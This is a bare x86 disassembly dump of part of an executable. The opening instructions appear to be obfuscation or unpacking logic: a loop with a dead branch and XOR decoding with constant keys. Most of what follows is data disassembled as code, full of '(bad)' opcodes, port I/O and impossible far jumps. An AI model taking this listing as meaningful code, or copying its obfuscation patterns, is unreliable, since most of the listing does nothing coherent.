  40799a:	xor    edi,edi
  40799c:	add    edi,DWORD PTR ds:0x4335ef
  4079a2:	or     edi,DWORD PTR ds:0x433663
  4079a8:	mov    DWORD PTR ds:0x4335ef,edi
  4079ae:	mov    edi,0xf89f2dad
  4079b3:	and    DWORD PTR ds:0x4335b3,0x0
  4079bd:	jmp    0x4079cf
  4079c2:	mov    esi,DWORD PTR ds:0x4335b3
  4079c8:	inc    esi
  4079c9:	mov    DWORD PTR ds:0x4335b3,esi
  4079cf:	cmp    DWORD PTR ds:0x4335b3,0x1e
  4079d6:	jae    0x4079f7
  4079dc:	cmp    DWORD PTR ds:0x4335b3,0x2c
  4079e3:	jne    0x4079f2
  4079e9:	push   DWORD PTR [ebp-0x28]
  4079ec:	call   DWORD PTR ds:0x4120c8
  4079f2:	jmp    0x4079c2
  4079f7:	mov    DWORD PTR [eax],edi
  4079f9:	mov    eax,DWORD PTR [ebp-0x14]
  4079fc:	mov    ebx,DWORD PTR [ebp-0x8]
  4079ff:	mov    ecx,0x7510853
  407a04:	xor    eax,ecx
  407a06:	mov    esi,0x32729a
  407a0b:	xor    ebx,ecx
  407a0d:	xor    edx,edx
  407a0f:	add    eax,esi
  407a11:	add    ebx,esi
  407a13:	div    ebx
  407a15:	mov    edx,DWORD PTR [ebp-0x20]
  407a18:	mov    DWORD PTR [ebp-0x2c],0x4ec5
  407a1f:	cmp    eax,DWORD PTR [edx]
  407a21:	je     0x40936a
  407a27:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  407a2e:	lea    eax,[ebp-0xc]
  407a31:	mov    DWORD PTR [ebp-0x10],eax
  407a34:	mov    eax,DWORD PTR [ebp-0x10]
  407a37:	mov    edx,DWORD PTR [eax]
  407a39:	jmp    0x407daf
  407a3e:	sub    eax,0xb2df1e8f
  407a43:	imul   ebp,ebp,0x58ddbe5d
  407a49:	or     BYTE PTR [esi+0x29f9cac1],ah
  407a4f:	aam    0x7c
  407a51:	jl     0x407a2a
  407a53:	jns    0x407ad1
  407a55:	jl     0x407a3a
  407a57:	pusha  
  407a58:	add    al,0x69
  407a5a:	adc    BYTE PTR [eax+0x166d66],0x8c
  407a61:	test   DWORD PTR [edx-0x6a],ebp
  407a64:	cmp    esi,DWORD PTR [ebp-0x37]
  407a67:	jp     0x407a54
  407a69:	dec    ebp
  407a6a:	out    0x79,al
  407a6c:	call   0x2309:0xa1c868f1
  407a73:	test   eax,0x3f7c8816
  407a78:	popf   
  407a79:	push   eax
  407a7a:	lea    edx,[esi-0x788fd686]
  407a80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a81:	mov    cl,0x9f
  407a83:	daa    
  407a84:	mov    ebx,0xe705a8b3
  407a89:	mov    bh,0x76
  407a8b:	hlt    
  407a8c:	pop    esp
  407a8d:	add    eax,0xdf9130ab
  407a92:	and    al,BYTE PTR [edi+ecx*4-0x1f3d53c3]
  407a99:	repz in eax,0x54
  407a9c:	pop    ss
  407a9d:	or     ebx,DWORD PTR [ecx+0xe]
  407aa0:	test   eax,0x837d9ec9
  407aa5:	and    al,0x47
  407aa7:	inc    ebp
  407aa8:	jge    0x407a39
  407aaa:	and    ebp,DWORD PTR [edi+0x1a191355]
  407ab0:	inc    eax
  407ab1:	(bad)  
  407ab2:	in     eax,dx
  407ab3:	fcomp  QWORD PTR [ebx-0x3b]
  407ab6:	and    eax,0x3b137e2a
  407abb:	sahf   
  407abc:	push   edi
  407abd:	mov    dl,0xb9
  407abf:	(bad)  
  407ac0:	or     eax,0x696504ea
  407ac5:	rcl    esi,1
  407ac7:	lds    eax,FWORD PTR [esi+0x3113b2a1]
  407acd:	popa   
  407ace:	imul   ecx,esi,0xe
  407ad1:	cs lahf 
  407ad3:	mov    al,ds:0xcc7c6a84
  407ad8:	pop    ebp
  407ad9:	pop    esi
  407ada:	inc    ecx
  407adb:	mov    BYTE PTR [ebx-0x5c404d40],bl
  407ae1:	dec    eax
  407ae2:	jbe    0x407a9b
  407ae4:	shl    ebp,0x7b
  407ae7:	clc    
  407ae8:	add    BYTE PTR [edx-0x44ea812b],al
  407aee:	icebp  
  407aef:	pop    ds
  407af0:	popa   
  407af1:	jl     0x407a85
  407af3:	sbb    eax,0x72efe787
  407af8:	adc    eax,DWORD PTR [edx+eax*8-0x45a73394]
  407aff:	(bad)  [eax]
  407b01:	adc    DWORD PTR [esi-0x24697d],esp
  407b07:	addr16 sbb al,0xc3
  407b0a:	or     al,0xc8
  407b0c:	or     esp,DWORD PTR [esi]
  407b0e:	fisttp WORD PTR [ecx]
  407b10:	pushf  
  407b11:	bound  esi,QWORD PTR [ebx+ebp*1+0x16]
  407b15:	add    al,0x69
  407b17:	je     0x407b49
  407b19:	arpl   WORD PTR [edi+0x68],bx
  407b1c:	xchg   esp,eax
  407b1d:	cmp    bl,ch
  407b1f:	cld    
  407b20:	stos   BYTE PTR es:[edi],al
  407b21:	retf   
  407b22:	mov    dh,0xb0
  407b24:	jnp    0x407aab
  407b26:	dec    edi
  407b27:	jb     0x407ade
  407b29:	jl     0x407b73
  407b2b:	sti    
  407b2c:	xor    BYTE PTR [edx-0x6085177d],dl
  407b32:	pop    ss
  407b33:	rcr    BYTE PTR [ebp+0xc],1
  407b36:	push   edx
  407b37:	test   edi,ebx
  407b39:	push   ebp
  407b3a:	fcom   QWORD PTR [esi+ecx*8+0x76edcebb]
  407b41:	adc    edx,DWORD PTR [ebx+edi*4]
  407b44:	pop    esp
  407b45:	and    DWORD PTR [ebp+0x68],esp
  407b48:	ret    
  407b49:	mov    ecx,0xfdd6c020
  407b4e:	sbb    DWORD PTR [eax],esi
  407b50:	mov    edi,0xa8ff3647
  407b55:	fs ins DWORD PTR es:[edi],dx
  407b57:	inc    edx
  407b58:	outs   dx,DWORD PTR ds:[esi]
  407b59:	retf   0xb62c
  407b5c:	pop    es
  407b5d:	push   ds
  407b5e:	mov    ds:0x3a84e0ab,eax
  407b63:	inc    ecx
  407b64:	add    eax,0xf8530b3d
  407b69:	jbe    0x407b7e
  407b6b:	push   0xfffffffd
  407b6d:	inc    dh
  407b6f:	shr    BYTE PTR ds:0xcb03a294,0x4a
  407b77:	push   eax
  407b78:	xchg   edi,eax
  407b79:	mov    eax,0xb5f8f140
  407b7e:	pop    edx
  407b7f:	cwde   
  407b80:	repz fcomp DWORD PTR [ecx]
  407b83:	sub    eax,0xa31c705f
  407b88:	dec    ecx
  407b89:	xor    BYTE PTR [eax],ah
  407b8b:	sbb    al,0x77
  407b8d:	popf   
  407b8e:	adc    DWORD PTR [esi-0x17fcd66b],ecx
  407b94:	sub    BYTE PTR [esi-0x23],ch
  407b97:	push   ds
  407b98:	sbb    BYTE PTR [esi+0x1dfc6754],ch
  407b9e:	popf   
  407b9f:	jmp    0x673027e6
  407ba4:	mov    ah,0xa6
  407ba6:	(bad)  
  407ba7:	cmp    al,0x78
  407ba9:	jns    0x407bbb
  407bab:	test   BYTE PTR [ebp+0x4cd2f369],bh
  407bb1:	pop    ds
  407bb2:	add    ebp,ecx
  407bb4:	cmp    bh,BYTE PTR [edx+0x58]
  407bb7:	cmp    DWORD PTR [eax],edi
  407bb9:	inc    esp
  407bba:	inc    ebp
  407bbb:	xchg   ecx,eax
  407bbc:	in     al,0x6b
  407bbe:	lahf   
  407bbf:	sbb    BYTE PTR [ebp-0x10],ah
  407bc2:	mov    ds:0xc33f24db,eax
  407bc7:	push   eax
  407bc8:	inc    esi
  407bc9:	fisttp QWORD PTR [esi-0x49378e46]
  407bcf:	popf   
  407bd0:	loope  0x407c29
  407bd2:	inc    eax
  407bd3:	push   es
  407bd4:	scas   al,BYTE PTR es:[edi]
  407bd5:	push   ebx
  407bd6:	xchg   ebx,eax
  407bd7:	dec    ecx
  407bd8:	xchg   BYTE PTR [edi],ah
  407bda:	fistp  WORD PTR [esi+0x31]
  407bdd:	inc    edx
  407bde:	aaa    
  407bdf:	je     0x407c56
  407be1:	cmc    
  407be2:	mov    ds:0x339553be,al
  407be7:	enter  0xc68e,0x19
  407beb:	jbe    0x407c21
  407bed:	enter  0x997a,0x2d
  407bf1:	shl    BYTE PTR ds:[edx+0x20],cl
  407bf5:	aaa    
  407bf6:	(bad)  
  407bf7:	mov    ds:0x8d9c5bb0,eax
  407bfc:	and    dl,cl
  407bfe:	and    dh,BYTE PTR [esi]
  407c00:	pop    edx
  407c01:	adc    DWORD PTR [ecx+0x36afebf7],ecx
  407c07:	mov    ds,esi
  407c09:	jmp    0x70c0:0x91b04674
  407c10:	test   al,0x64
  407c12:	pop    esi
  407c13:	shl    ecx,cl
  407c15:	jmp    0xfbcd:0x2800e036
  407c1c:	push   ecx
  407c1d:	in     al,0x9d
  407c1f:	loope  0x407be9
  407c21:	retf   0x3ca1
  407c24:	push   ebp
  407c25:	jmp    0xaae4f729
  407c2a:	adc    al,0x46
  407c2c:	inc    eax
  407c2d:	inc    ebp
  407c2e:	das    
  407c2f:	popa   
  407c30:	test   eax,0x88b9d556
  407c35:	daa    
  407c36:	shl    BYTE PTR [ecx+0x13],0x1a
  407c3a:	pop    esp
  407c3b:	data16 adc BYTE PTR [ecx],cl
  407c3e:	arpl   di,dx
  407c40:	dec    esi
  407c41:	popa   
  407c42:	jbe    0x407c00
  407c44:	(bad)  
  407c46:	xor    dh,BYTE PTR [ebx+0x9c27de7]
  407c4c:	mov    ecx,0xae3add59
  407c51:	test   esi,esi
  407c53:	cmp    bh,BYTE PTR [ebx-0x5de87843]
  407c59:	adc    al,0xdf
  407c5b:	daa    
  407c5c:	js     0x407c80
  407c5e:	adc    eax,0x5585d59
  407c63:	ja     0x407c03
  407c65:	addr16 ret 0x9530
  407c69:	inc    ebp
  407c6a:	inc    esp
  407c6b:	xchg   edi,eax
  407c6c:	push   ds
  407c6d:	xor    bh,ah
  407c6f:	or     eax,0xc135a250
  407c74:	les    esp,FWORD PTR ds:0xbd04cfee
  407c7a:	adc    DWORD PTR [edx-0x68],edi
  407c7d:	and    BYTE PTR [ecx-0x79],bl
  407c80:	push   edx
  407c81:	leave  
  407c82:	dec    eax
  407c83:	push   0xffffff91
  407c85:	pop    esi
  407c86:	pop    ecx
  407c87:	ret    0xcef7
  407c8a:	mov    esp,0xa444359e
  407c8f:	stc    
  407c90:	mov    eax,0xc3851d67
  407c95:	test   al,0xf8
  407c97:	cmp    eax,0x27e41f8f
  407c9c:	cmc    
  407c9d:	sbb    al,0xc7
  407c9f:	pop    esi
  407ca0:	mov    ebx,0xc10b28f9
  407ca5:	jmp    0x407d20
  407ca7:	int    0x49
  407ca9:	push   ebx
  407caa:	dec    edx
  407cab:	stc    
  407cac:	mov    cl,0x61
  407cae:	shl    DWORD PTR [edx],cl
  407cb0:	mov    bl,0x24
  407cb2:	pushf  
  407cb3:	xchg   esp,eax
  407cb4:	sar    DWORD PTR [edx+0x53f2a72a],0xef
  407cbb:	pop    ebx
  407cbc:	test   al,0xcd
  407cbe:	or     dl,bl
  407cc0:	les    ebx,FWORD PTR [ebp+ecx*8-0x1d]
  407cc4:	in     al,dx
  407cc5:	retf   0xbd9b
  407cc8:	in     eax,0x5c
  407cca:	inc    edx
  407ccb:	jns    0x407d0e
  407ccd:	mov    ebp,DWORD PTR [edx]
  407ccf:	cdq    
  407cd0:	xchg   esi,eax
  407cd1:	fwait
  407cd2:	push   edx
  407cd3:	imul   edi,eax,0xf3c92990
  407cd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407cda:	mov    esi,DWORD PTR [edi]
  407cdc:	add    al,0xca
  407cde:	push   ebx
  407cdf:	push   edi
  407ce0:	pop    esi
  407ce1:	dec    ebp
  407ce2:	xchg   ecx,eax
  407ce3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ce4:	mov    ss,WORD PTR [ebp-0x35397632]
  407cea:	mov    BYTE PTR [ebx+0x5d],al
  407ced:	jbe    0x407cb6
  407cef:	aam    0x52
  407cf1:	add    eax,0xc5d1c6a5
  407cf6:	in     eax,0x88
  407cf8:	mov    esi,0xefff9527
  407cfd:	and    ecx,0x302d63a9
  407d03:	jbe    0x407d7d
  407d05:	pop    eax
  407d06:	sub    dh,BYTE PTR [edi-0x4c]
  407d09:	dec    ebp
  407d0a:	shl    al,1
  407d0c:	pop    ds
  407d0d:	xor    al,0x2f
  407d0f:	push   0xffffffc8
  407d11:	retf   
  407d12:	adc    BYTE PTR [ebx+0x5],0x77
  407d16:	rcr    BYTE PTR [ebx-0x63beae01],cl
  407d1c:	iret   
  407d1d:	push   ss
  407d1e:	aad    0xbd
  407d20:	mov    esi,0x73f5998f
  407d25:	jb     0x407d2f
  407d27:	xor    al,0xa
  407d29:	sbb    al,0x34
  407d2b:	adc    eax,0xa0a422b4
  407d30:	jns    0x407da8
  407d32:	outs   dx,DWORD PTR ds:[esi]
  407d33:	int3   
  407d34:	add    al,0xd2
  407d36:	mov    edx,0x8f750469
  407d3b:	repnz mov esi,0x33411f0
  407d41:	jl     0x407cd6
  407d43:	add    eax,0x200443c9
  407d48:	push   esi
  407d49:	push   ebx
  407d4a:	push   ecx
  407d4b:	(bad)  
  407d4c:	das    
  407d4d:	aaa    
  407d4e:	push   edx
  407d4f:	lods   eax,DWORD PTR ds:[esi]
  407d50:	sub    edx,esi
  407d52:	mov    edx,0x1be1cda4
  407d57:	scas   al,BYTE PTR es:[edi]
  407d58:	test   eax,0x272f6ee8
  407d5d:	es loope 0x407d8b
  407d60:	fadd   DWORD PTR [ebp-0x47]
  407d63:	push   edi
  407d64:	sar    DWORD PTR [eax+0xeefe81a],1
  407d6a:	fisttp QWORD PTR [ebx*2-0x633e7e56]
  407d71:	xchg   ecx,eax
  407d72:	sbb    bl,BYTE PTR ds:0x11a1488
  407d78:	fidiv  WORD PTR [eax]
  407d7a:	and    esp,DWORD PTR [ebx+ebx*8]
  407d7d:	call   0x89bb7e25
  407d82:	adc    BYTE PTR [ebx],dh
  407d84:	les    edx,FWORD PTR [ebp+0x7c7e6ad8]
  407d8a:	push   esp
  407d8b:	push   esp
  407d8c:	or     eax,0xdcb7ffcc
  407d91:	int3   
  407d92:	je     0x407d54
  407d94:	and    DWORD PTR [edi-0x3c],ecx
  407d97:	pushf  
  407d98:	mov    al,0xdd
  407d9a:	sub    al,BYTE PTR [ebx]
  407d9c:	(bad)  [ebx-0x4a974633]
  407da2:	pusha  
  407da3:	adc    ebx,edi
  407da5:	rol    BYTE PTR [edx-0x5ada09f0],1
  407dab:	mov    edx,0x6938f2de
  407db0:	shr    al,cl
  407db2:	test   eax,0x1089f89e
  407db7:	mov    eax,DWORD PTR [ebp-0xc]
  407dba:	cmp    eax,0x58133098
  407dbf:	jmp    0x408135
  407dc4:	cwde   
  407dc5:	mov    eax,ds:0x5b4dbc42
  407dca:	mov    ds:0x4fdb206d,al
  407dcf:	or     dh,BYTE PTR [edi+0x44]
  407dd2:	fcmovnbe st,st(1)
  407dd4:	adc    cl,0x7c
  407dd7:	jl     0x407db0
  407dd9:	jns    0x407e57
  407ddb:	jl     0x407d9b
  407ddd:	xor    eax,0x80f099b2
  407de2:	das    
  407de3:	scas   eax,DWORD PTR es:[edi]
  407de4:	sub    al,0xac
  407de6:	sar    DWORD PTR [ebx-0x46],1
  407de9:	iret   
  407dea:	bound  edx,QWORD PTR [edx-0x55a42697]
  407df0:	and    eax,0xb3c26d82
  407df5:	fldcw  WORD PTR [esi]
  407df7:	aam    0x1f
  407df9:	inc    esi
  407dfa:	and    BYTE PTR [ecx-0x274d81e6],0xa0
  407e01:	cmp    ebp,eax
  407e03:	cdq    
  407e04:	push   0xffffffd2
  407e06:	test   eax,0xde7d6bc1
  407e0b:	or     DWORD PTR [esi+0x61],edx
  407e0e:	jo     0x407e7c
  407e10:	mov    DWORD PTR [eax],esp
  407e12:	ja     0x407de9
  407e14:	jb     0x407e7b
  407e16:	js     0x407dc2
  407e18:	es dec eax
  407e1a:	sbb    DWORD PTR [eax],edi
  407e1c:	cs ss push es
  407e1f:	mov    ecx,esp
  407e21:	popa   
  407e22:	int3   
  407e23:	int3   
  407e24:	jns    0x407dd5
  407e26:	jne    0x407dd6
  407e28:	and    al,0xab
  407e2a:	out    0xcc,eax
  407e2c:	sbb    ah,0x5e
  407e2f:	sub    eax,0x5fb9d92e
  407e34:	enter  0x3e5a,0xf5
  407e38:	and    ah,bl
  407e3a:	fimul  DWORD PTR [eax-0x24]
  407e3d:	mov    bl,0x67
  407e3f:	mov    ah,0xae
  407e41:	jbe    0x407e67
  407e43:	faddp  st(1),st
  407e45:	adc    al,0x95
  407e47:	aas    
  407e48:	dec    ebp
  407e49:	sub    bx,WORD PTR ds:0x821c6a1f
  407e50:	inc    ebp
  407e51:	nop
  407e52:	or     BYTE PTR [ebx],dl
  407e54:	cld    
  407e55:	js     0x407e89
  407e57:	leave  
  407e58:	or     al,0xf7
  407e5a:	inc    esp
  407e5b:	push   0x8bae2a74
  407e60:	mov    al,0x30
  407e62:	sbb    ecx,DWORD PTR [esi+esi*1+0x34ecc48c]
  407e69:	lahf   
  407e6a:	shl    BYTE PTR [edx+0xc],1
  407e6d:	shl    BYTE PTR [esi-0x2350f33b],1
  407e73:	xor    esi,DWORD PTR [esp+ecx*1-0x3f]
  407e77:	mov    esp,DWORD PTR [edx+0x4e8ce520]
  407e7d:	out    0xa2,eax
  407e7f:	add    eax,0x744e36d1
  407e84:	int    0x58
  407e86:	add    al,0x2a
  407e88:	(bad)  
  407e89:	jnp    0x407e54
  407e8b:	xor    bl,BYTE PTR [ebp+0x9ae0589]
  407e91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e92:	pop    ebp
  407e93:	lock inc edx
  407e95:	sub    BYTE PTR [esi+0x7b5134fa],0x4f
  407e9c:	jmp    0xfd39:0xd37d6550
  407ea3:	jecxz  0x407e80
  407ea5:	scas   al,BYTE PTR es:[edi]
  407ea6:	fdivr  st,st(1)
  407ea8:	in     eax,dx
  407ea9:	cmp    ch,ch
  407eab:	push   ecx
  407eac:	pushf  
  407ead:	push   ds
  407eae:	mov    ah,0xa4
  407eb0:	lea    eax,[ebp-0x5b]
  407eb3:	pushf  
  407eb4:	jnp    0x407f10
  407eb6:	(bad)  
  407eb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407eb8:	test   BYTE PTR [ebx+0x63],dh
  407ebb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ebc:	sbb    ecx,edi
  407ebe:	sub    eax,ecx
  407ec0:	bound  ebp,QWORD PTR [esp+esi*4+0x70]
  407ec4:	mov    dh,0x5b
  407ec6:	fld    TBYTE PTR [ecx]
  407ec8:	iret   
  407ec9:	retf   
  407eca:	lock movs DWORD PTR es:[edi],DWORD PTR ss:[esi]
  407ecd:	fcomp  QWORD PTR [esi+0x113e73e2]
  407ed3:	je     0x407f09
  407ed5:	xchg   ecx,eax
  407ed6:	gs or  esi,eax
  407ed9:	jmp    0xbadd:0xbce8b6a
  407ee0:	xchg   esp,eax
  407ee1:	pop    esi
  407ee2:	popa   
  407ee3:	out    0xdc,al
  407ee5:	test   eax,0x79005342
  407eea:	dec    eax
  407eeb:	in     eax,0xd5
  407eed:	sbb    al,BYTE PTR [edx+esi*4]
  407ef0:	repnz mov edi,0xb58cb77a
  407ef6:	dec    ebx
  407ef7:	add    al,0x6b
  407ef9:	lahf   
  407efa:	adc    BYTE PTR [ebx-0x52efcb4f],0x62
  407f01:	mov    ebp,0x80ca9b40
  407f06:	cmp    cl,bh
  407f08:	loopne 0x407ebe
  407f0a:	call   0x6825f7c4
  407f0f:	ins    BYTE PTR es:[edi],dx
  407f10:	mov    dl,0xfb
  407f12:	fmul   DWORD PTR [esp+edx*8-0x1ce23871]
  407f19:	scas   eax,DWORD PTR es:[edi]
  407f1a:	scas   al,BYTE PTR es:[edi]
  407f1b:	jl     0x407f37
  407f1d:	stos   BYTE PTR es:[edi],al
  407f1e:	push   ebx
  407f1f:	mov    ch,0x96
  407f21:	adc    al,0x0
  407f23:	sbb    DWORD PTR [esi-0x53],0xd321e887
  407f2a:	mov    eax,ds:0x42600e73
  407f2f:	es imul ebx,ebx,0xbeecaefe
  407f36:	push   ss
  407f37:	dec    ebx
  407f38:	mov    cl,0x96
  407f3a:	or     ah,BYTE PTR [esi+0x9]
  407f3d:	xchg   esi,eax
  407f3e:	xor    DWORD PTR ds:0x4105b21,0x33ba0df
  407f48:	sbb    eax,0xa48dd6a9
  407f4d:	cmp    esi,DWORD PTR [ecx+eax*8+0x45]
  407f51:	sbb    al,0x8d
  407f53:	push   es
  407f54:	rol    DWORD PTR [ecx],cl
  407f56:	push   esi
  407f57:	push   ds
  407f58:	mov    ebx,0x38b868b
  407f5d:	mov    edx,0x48ff6da0
  407f62:	cwde   
  407f63:	sbb    al,0xb6
  407f65:	sbb    eax,0x5855cb76
  407f6a:	lock and dh,BYTE PTR [ebx+0x32]
  407f6e:	aaa    
  407f6f:	jns    0x407fcf
  407f71:	inc    ebx
  407f72:	push   cs
  407f73:	sub    eax,0x7718e981
  407f78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f79:	(bad)  
  407f7a:	xor    BYTE PTR [edx+edx*2+0x72],al
  407f7e:	dec    esp
  407f7f:	out    dx,al
  407f80:	sub    ecx,DWORD PTR [esi-0x13c83bba]
  407f86:	mov    esi,0xe0a069ca
  407f8b:	fs pop ds
  407f8d:	imul   esi,DWORD PTR [edx],0xbb3e8c7e
  407f93:	aas    
  407f94:	mov    cl,0x9b
  407f96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f97:	fndisi(8087 only) 
  407f99:	sbb    esp,DWORD PTR [edx+0x48d9f881]
  407f9f:	xchg   ecx,eax
  407fa0:	pop    esi
  407fa1:	(bad)  
  407fa2:	retf   0x9916
  407fa5:	jns    0x407fac
  407fa7:	and    al,0xd8
  407fa9:	clc    
  407faa:	fstp   TBYTE PTR [eax-0x32]
  407fad:	pop    eax
  407fae:	inc    ebp
  407faf:	lods   eax,DWORD PTR ds:[esi]
  407fb0:	sar    dh,cl
  407fb2:	jno    0x407ff7
  407fb4:	inc    edx
  407fb5:	ret    0x1969
  407fb8:	sbb    bh,cl
  407fba:	es sbb al,0xb9
  407fbd:	dec    eax
  407fbe:	addr16 out 0x82,eax
  407fc1:	add    eax,0x7b118455
  407fc6:	sbb    cl,BYTE PTR [ebx+0x5e984970]
  407fcc:	mov    dh,0x28
  407fce:	call   0x6eae4067
  407fd3:	cli    
  407fd4:	jg     0x407f81
  407fd6:	jns    0x407ff0
  407fd8:	push   ebx
  407fd9:	les    edi,FWORD PTR [edx]
  407fdb:	mov    dh,BYTE PTR [ebx]
  407fdd:	pop    edi
  407fde:	add    BYTE PTR [ebx+eiz*4],bh
  407fe1:	cmp    DWORD PTR [edx],edx
  407fe3:	aad    0x52
  407fe5:	mov    ebx,eax
  407fe7:	in     eax,dx
  407fe8:	lds    esp,FWORD PTR [edx+0x368cdad]
  407fee:	out    dx,eax
  407fef:	xor    al,0x92
  407ff1:	cld    
  407ff2:	iret   
  407ff3:	shl    DWORD PTR [esi],0x5a
  407ff6:	sbb    al,0xa9
  407ff8:	mov    cl,0xb5
  407ffa:	pop    eax
  407ffb:	loope  0x407f9a
  407ffd:	mov    ds:0x27ed7220,al
  408002:	add    edi,edx
  408004:	mov    bh,BYTE PTR [esi-0x266e04a1]
  40800a:	sbb    BYTE PTR [eax+0x5957d079],ch
  408010:	xchg   ecx,eax
  408011:	add    al,0x71
  408013:	pop    ebp
  408014:	ret    
  408015:	aaa    
  408016:	stos   DWORD PTR es:[edi],eax
  408017:	repnz mov WORD PTR [ebp-0x92324a1],es
  40801e:	bound  ebx,QWORD PTR [esi+0x6]
  408021:	and    eax,0x38879042
  408026:	int3   
  408027:	cmp    ah,BYTE PTR [edx-0x1a]
  40802a:	and    BYTE PTR [ebp-0x36],cl
  40802d:	fnstenv [ebx]
  40802f:	xor    BYTE PTR [ebx-0x2c64057a],bh
  408035:	or     DWORD PTR [edx+0x5d],ecx
  408038:	adc    BYTE PTR [ecx-0x31],al
  40803b:	cmp    al,BYTE PTR [esi+eiz*2-0x4d7ac065]
  408042:	or     eax,0x98eb9a3d
  408047:	icebp  
  408048:	pop    ss
  408049:	gs push 0x10
  40804c:	hlt    
  40804d:	(bad)  
  40804e:	and    BYTE PTR [ebp-0x4],ah
  408051:	pop    ebp
  408052:	mov    dl,0xdf
  408054:	pop    ebx
  408055:	mov    esi,0x8a835813
  40805a:	in     eax,0x8e
  40805c:	mov    ecx,0x151b8a9c
  408061:	inc    ebp
  408062:	es sti 
  408064:	xchg   ebp,eax
  408065:	xor    esp,DWORD PTR [esi]
  408067:	dec    eax
  408068:	jl     0x4080e2
  40806a:	pop    esi
  40806b:	ins    BYTE PTR es:[edi],dx
  40806c:	jle    0x40800a
  40806e:	rol    DWORD PTR [eax+eax*1-0x1a],1
  408072:	push   es
  408073:	jecxz  0x4080a2
  408075:	jbe    0x408098
  408077:	jmp    0x40805c
  408079:	fwait
  40807a:	pop    ss
  40807b:	adc    ebp,DWORD PTR ds:0x685230d7
  408081:	mov    DWORD PTR [edi+0x60],esi
  408084:	mov    ecx,0x9084f255
  408089:	out    dx,al
  40808a:	sub    edx,DWORD PTR [ebx+0x29875d74]
  408090:	mov    cl,bl
  408092:	dec    ecx
  408093:	mov    DWORD PTR [esp+ecx*4],0x63c21618
  40809a:	add    ecx,ebp
  40809c:	dec    ecx
  40809d:	or     al,0x4a
  40809f:	cmp    eax,0xc2b190e6
  4080a4:	int    0x65
  4080a6:	cld    
  4080a7:	lea    esp,[eax+0x7f]
  4080aa:	dec    ecx
  4080ab:	xchg   ebp,eax
  4080ac:	popf   
  4080ad:	push   esp
  4080ae:	jns    0x4080a5
  4080b0:	add    al,0xe8
  4080b2:	test   cl,al
  4080b4:	sbb    eax,0x145b8886
  4080b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4080ba:	(bad)  
  4080bb:	jle    0x40807d
  4080bd:	inc    ecx
  4080be:	rcr    DWORD PTR [ecx-0x11159786],1
  4080c4:	inc    ebp
  4080c5:	jecxz  0x408128
  4080c7:	test   BYTE PTR [edi-0x4c],bh
  4080ca:	jmp    0x4080c7
  4080cc:	addr16 jge 0x408062
  4080cf:	(bad)  
  4080d0:	mov    ecx,edi
  4080d2:	xchg   edi,eax
  4080d3:	les    ebp,FWORD PTR [ebx]
  4080d5:	jnp    0x40813b
  4080d7:	mov    edx,0x98571a96
  4080dc:	sbb    bl,al
  4080de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4080df:	cwde   
  4080e0:	and    edx,DWORD PTR [eax-0x77]
  4080e3:	inc    ebx
  4080e4:	xor    esp,DWORD PTR [ecx+ebx*4-0x28]
  4080e8:	rcl    BYTE PTR [eax],cl
  4080ea:	push   edi
  4080eb:	mov    ds:0x93dfdbeb,al
  4080f0:	or     al,0xa5
  4080f2:	xor    bl,BYTE PTR [edx+0x71]
  4080f5:	or     al,0x95
  4080f7:	data16 mov BYTE PTR [ebp-0x24],al
  4080fb:	mov    eax,ds:0xb3f3d962
  408100:	sub    DWORD PTR [eax-0x5b],eax
  408103:	and    bl,BYTE PTR [ecx+0x412509c4]
  408109:	cmp    eax,0xc046ef73
  40810e:	mov    ebp,0xd7a07123
  408113:	mov    edx,0xee73cb7f
  408118:	fcomp  QWORD PTR [edi+0x75871a58]
  40811e:	xlat   BYTE PTR ds:[ebx]
  40811f:	in     al,dx
  408120:	mov    ebp,0x94a0eb5c
  408125:	loopne 0x40815c
  408127:	in     al,dx
  408128:	cmp    dl,BYTE PTR [ebp+0x4b]
  40812b:	pusha  
  40812c:	mov    DWORD PTR [edx+0xb45e0f9],esp
  408132:	jns    0x408142
  408134:	iret   
  408135:	je     0x4084c8
  40813b:	mov    eax,DWORD PTR [ebp-0x1c]
  40813e:	or     DWORD PTR [eax],0x60751c98
  408144:	jmp    0x4084ba
  408149:	pop    edx
  40814a:	jns    0x4080ea
  40814c:	fs bound ecx,QWORD PTR gs:[di]
  408151:	add    ebp,ebp
  408153:	push   ebx
  408154:	sbb    edx,DWORD PTR [ebp+0x5b327a33]
  40815a:	sar    BYTE PTR [esp+edi*2-0x29],cl
  40815e:	jns    0x4081dc
  408160:	jl     0x408181
  408162:	and    al,0xba
  408164:	xlat   BYTE PTR ds:[ebx]
  408165:	ins    BYTE PTR es:[edi],dx
  408166:	nop
  408167:	mov    ecx,0x43ab3fb8
  40816c:	cmp    esp,esi
  40816e:	loop   0x408110
  408170:	ins    BYTE PTR es:[edi],dx
  408171:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408172:	inc    ecx
  408173:	adc    esp,DWORD PTR ds:0xf227e1bf
  408179:	loop   0x40819d
  40817b:	jmp    0x8928:0x64595bc9
  408182:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408183:	cli    
  408184:	mov    edi,0x9f267715
  408189:	xchg   esi,eax
  40818a:	mov    al,ds:0x77f60daa
  40818f:	add    cl,BYTE PTR [ebp+0x5f54868]
  408195:	cs in  al,0x9b
  408198:	jl     0x408158
  40819a:	or     eax,0xa681ec37
  40819f:	jp     0x408142
  4081a1:	jb     0x40819d
  4081a3:	inc    eax
  4081a4:	push   eax
  4081a5:	mov    al,0xb0
  4081a7:	xchg   edx,eax
  4081a9:	mov    edi,0x8e292cc8
  4081ae:	cmp    edx,DWORD PTR [eax]
  4081b0:	jnp    0x408189
  4081b2:	(bad)  [ecx]
  4081b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4081b5:	sub    ecx,DWORD PTR [eax]
  4081b7:	in     eax,dx
  4081b8:	arpl   WORD PTR [ecx-0x65],si
  4081bb:	jns    0x40817e
